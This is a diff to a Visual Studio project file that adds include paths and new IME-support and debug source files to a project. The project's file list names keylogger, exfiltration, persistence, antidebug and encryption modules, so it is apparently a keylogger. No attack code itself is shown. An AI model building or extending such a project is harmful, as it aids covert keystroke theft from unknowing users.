@@ -92,6 +92,7 @@
       <SDLCheck>true</SDLCheck>
       <PreprocessorDefinitions>WIN32;NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
       <ConformanceMode>true</ConformanceMode>
+      <AdditionalIncludeDirectories>$(ProjectDir)include</AdditionalIncludeDirectories>
     </ClCompile>
     <Link>
       <SubSystem>Console</SubSystem>
@@ -122,6 +123,7 @@
       <SDLCheck>true</SDLCheck>
       <PreprocessorDefinitions>NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
       <ConformanceMode>true</ConformanceMode>
+      <AdditionalIncludeDirectories>$(ProjectDir)include</AdditionalIncludeDirectories>
     </ClCompile>
     <Link>
       <SubSystem>Console</SubSystem>
@@ -135,6 +137,7 @@
     <ClCompile Include="d1.cpp" />
     <ClCompile Include="encryption.cpp" />
     <ClCompile Include="exfiltration.cpp" />
+    <ClCompile Include="ime_support.cpp" />
     <ClCompile Include="keylogger.cpp" />
     <ClCompile Include="multilanguage.cpp" />
     <ClCompile Include="persistence.cpp" />
@@ -142,9 +145,11 @@
   </ItemGroup>
   <ItemGroup>
     <ClInclude Include="common.h" />
+    <ClInclude Include="debug_utils.h" />
     <ClInclude Include="encryption.h" />
     <ClInclude Include="antidebug.h" />
     <ClInclude Include="exfiltration.h" />
+    <ClInclude Include="ime_support.h" />
     <ClInclude Include="keylogger.h" />
     <ClInclude Include="multilanguage.h" />
     <ClInclude Include="persistence.h" />
